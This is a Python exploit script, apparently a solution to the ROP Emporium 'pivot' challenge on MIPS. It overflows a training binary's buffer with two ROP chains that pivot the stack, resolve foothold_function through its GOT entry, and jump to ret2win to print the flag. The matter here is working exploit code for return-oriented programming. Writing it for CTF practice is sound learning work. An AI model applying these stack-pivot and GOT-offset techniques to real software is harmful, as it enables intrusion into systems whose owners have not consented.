#!/usr/bin/python3

"""Exploit for pivot MIPS."""

import argparse
import pathlib
import struct
import subprocess
import sys

# ROP gadgets

'''
   0x00400cd0 <+48>:    move    sp,s8
   0x00400cd4 <+52>:    lw  ra,8(sp)
   0x00400cd8 <+56>:    lw  s8,4(sp)
   0x00400cdc <+60>:    jr  ra
   0x00400ce0 <+64>:    addiu   sp,sp,12
   0x00400ce4 <+68>:    nop
'''
STACK_PIVOT = 0x400cd0

'''
   0x00400ca0 <+0>: lw  t9,8(sp)
   0x00400ca4 <+4>: lw  t0,4(sp)
   0x00400ca8 <+8>: jalr    t9
   0x00400cac <+12>:    addiu   sp,sp,12
'''
LOAD_OFFSET = 0x400ca0

'''
   0x00400cb0 <+16>:    lw  t9,8(sp)
   0x00400cb4 <+20>:    lw  t2,4(sp)
   0x00400cb8 <+24>:    lw  t1,0(t2)
   0x00400cbc <+28>:    jalr    t9
   0x00400cc0 <+32>:    addiu   sp,sp,12
'''
LOAD_RESOLVED_ADDR = 0x400cb0

'''
   0x00400cc4 <+36>:    add t9,t0,t1
   0x00400cc8 <+40>:    jalr    t9
   0x00400ccc <+44>:    addiu   sp,sp,4
'''
CALC_ADDR_AND_JMP = 0x400cc4

# PLT entries
FOOTHOLD_PLT = 0x400e60

# GOT entries
FOOTHOLD_GOT = 0x412060

# distance from foothold to ret2win in libpivot.so
# 56: 00000d38   260 FUNC    GLOBAL DEFAULT   12 ret2win
# 65: 000009c0    88 FUNC    GLOBAL DEFAULT   12 foothold_function
RET2WIN_OFFSET = 0x378


def write_line(proc, line):
    """Write a line to the subprocess."""
    if not line.endswith(b'\n'):
        line = line + b'\n'

    proc.stdin.write(line)
    proc.stdin.flush()


def main(argv=sys.argv):
    """main."""
    parser = argparse.ArgumentParser(
        description='Exploit for pivot MIPS'
    )
    parser.add_argument(
        '-d',
        '--debug',
        help='Pause for debugger',
        action='store_true'
    )
    parser.add_argument(
        'target_prog',
        action='store',
        type=pathlib.Path,
        nargs='?',
        default=pathlib.Path('./pivot_mipsel'),
        help='Path to target program'
    )

    args = parser.parse_args()

    program = str(args.target_prog)

    if not program.startswith('/') and not program.startswith('./'):
        program = './{}'.format(program)

    print("Launching '{}'...".format(program))

    proc = subprocess.Popen(
        program.split(' '),
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )

    if args.debug:
        print('PID: {}'.format(proc.pid))
        input('Press enter to continue...')

    while True:
        line = proc.stdout.readline()

        # hunt for line with pivot address
        if b'The Old Gods' in line:
            break

    line = line.decode().strip()
    pivot_addr = int(line.split(' ')[-1], base=16)
    print('Found pivot address at 0x{:x}'.format(pivot_addr))

    # read one more line of content
    proc.stdout.readline().decode()

    print('Sending second ROP chain...')

    buf = b''
    buf += b'B' * 8
    buf += struct.pack('<I', LOAD_OFFSET)
    buf += b'C' * 8
    buf += struct.pack('<I', FOOTHOLD_PLT)
    buf += b'D' * 4
    buf += struct.pack('<I', FOOTHOLD_GOT)
    buf += struct.pack('<I', LOAD_OFFSET)
    buf += b'E' * 4
    buf += struct.pack('<I', RET2WIN_OFFSET)
    buf += struct.pack('<I', CALC_ADDR_AND_JMP)
    write_line(proc, buf)

    # read one more line of content
    proc.stdout.readline().decode()

    print('Sending first ROP chain...')

    buf = b'A' * 32
    buf += struct.pack('<I', pivot_addr)
    buf += struct.pack('<I', STACK_PIVOT)
    write_line(proc, buf)

    # Flag should be returned to stdout
    for i in range(0, 5):
        line = proc.stdout.readline().decode()
        if 'ROPE' in line:
            print(line.strip())
            return 0

    # no flag
    return 127


if __name__ == '__main__':
    sys.exit(main(sys.argv))
